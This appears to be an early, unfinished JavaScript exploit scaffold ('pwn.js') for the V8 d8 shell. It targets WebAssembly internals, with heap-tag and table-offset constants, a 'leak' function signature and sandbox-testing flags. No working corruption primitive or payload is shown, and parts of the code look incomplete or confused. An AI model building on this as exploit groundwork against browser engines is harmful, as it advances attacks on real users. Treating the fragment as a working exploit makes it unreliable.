// set args --trace-turbo --allow-natives-syntax --shell experiment.js
// set args --trace-turbo --allow-natives-syntax --shell pwn.js
// set args --trace-opt --trace-deopt --allow-natives-syntax --shell pwn.js
// set args --allow-natives-syntax --shell pwn.js
// set args --allow-natives-syntax --sandbox-testing --shell pwn.js

const kHeapObjectTag = 1;
const kWasmTableObjectTypeOffset = 32;

const kRef = 9;
const kSmiTagSize = 1;
const kHeapTypeShift = 5;

d8.file.execute("wasm-module-builder.js");

const builder = new WasmModuleBuilder();
builder.exportMemoryAs("mem0", 0);
let $mem0 = builder.addMemory(1, 1);
// dp($mem0);

let leak_sig = {
    'params': [126, 126, 126, 126, 126, 126, 126, 126],
    'results': [126]
}
let $sig_leak = builder.addType(leak_sig);
// console.log("[*] leak signature: " + $sig_leak);

let $f2 = builder.addFunction("func2", $sig_leak)
.exportFunc()
.addBody([
    kExprLocalGet, 0,
]);


console.log("======================================================================\n");
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
const wasmModule = new WebAssembly.Module(wasm_code);
const instance = new WebAssembly.Instance(wasmModule, {
    types: [
        {
            params: 8, 
            results: 1,
            is_final: true, 
            is_shared: false, 
            supertype: kNoSuperType
        }
    ],
    memories: [
        {
            min: 1,
            max: 1,
            shared: false,
            is_memory64: false
        }
    ],
    exports: [
        {
            name: "mem0",
            kind: kExternalMemory, 
            index: 0 
        },
        {

        }
    ]
});